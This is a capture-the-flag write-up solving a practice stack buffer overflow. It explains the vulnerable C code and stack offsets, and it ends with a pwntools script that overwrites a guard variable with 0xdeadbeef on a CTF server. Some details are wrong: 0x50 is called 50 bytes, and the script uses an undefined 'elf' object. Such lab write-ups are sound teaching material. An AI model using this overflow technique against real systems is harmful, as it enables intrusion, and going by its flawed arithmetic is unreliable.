**This is a writeup for the bof2 challenge**

Below is the main function that our vulnerable program is running.
```
int main(void) {
	int correct = 0;
	char bof[64];
	
	scanf("%s", bof);
	
	if(correct != 0xdeadbeef) {
		puts("you suck!");
		exit(0);
	}
	
	win();
	return 0;
}
```

After reviewing the code above we can see that it is similar to the bof1 challenge. We have a variable correct intialized to 0 and a char buffer that is allocated a space of 64 bytes.

Now we can see that we are scanning for user input. This user input is not sanitized as we are able to input more characters into the buffer than should be allowed.

If we look at the if statement, we can see that if the "correct" variable is equal to 0xdeadbeef then we enter the win function.

Below is the win function and the purpose of this function is to print the flag
```
void win(void) {
	char flag[64];
	
	FILE* fp = fopen("flag.txt", "r");
	if(!fp) {
		puts("error, contact admin");
		exit(0);
	}
	
	fgets(flag, sizeof(flag), fp);
	fclose(fp);
	puts(flag);
}
```

**Exploit method**

```
SUB ESP,0x50
```

This tells us that we are allocating 50 bytes of memory for the stack of the program.

Then we get the instruction:
```
MOV dword ptr[EBP + correct],0x0
```
Which means that we are setting the value of correct to 0

Our next important instruction is:
```
LEA EAX=>buf,[EBP + -0x4c]
```

What this instruction tells us is that wit hscanf, we are wring to buf + 8 as we did SUB ESP,0x8. 4c can be converted to 72 which is equal to 64 (the size of buf) + 8.

Now to figure out what our payload is, we need to look at how the stack is setup.

We can see that buf is at
```
Stack[-0x54]:64 buf
```
and correct is at 
```
Stack[-0x14]:4 correct
```

With this information we can calculate the offset between buf and correct by doing -0x54 - 0x14 = 0x40 which we can convert to 64 bytes.

Now that we have the offset, we can overwrite correct to equal 0xdeadbeef.

We will use the function p32() in order to pack a 32-bit integer into a little-endian byte string. Since it is in little endian, that means our least significant byte is stored first
```
Ex: p32(0xdeadbeef) => b'\xef\xbe\xad\xde
```

Using this function, we can convert deadbeef into a bit string that we will then use to overwrite correct
```
p32(0xdeadbeef)
```

Our final exploit will look like this
```
from pwn import *

TARGET_VALUE = 0xdeadbeef
BUFFER_SIZE = 64

payload = b"A" * BUFFER_SIZE + p32(TARGET_VALUE)


if args.REMOTE:
        r = remote("ctf.hackucf.org", 9001)
else:
        r = elf.debug(gdbscript = "c")

r.sendline(payload)
r.interactive()
```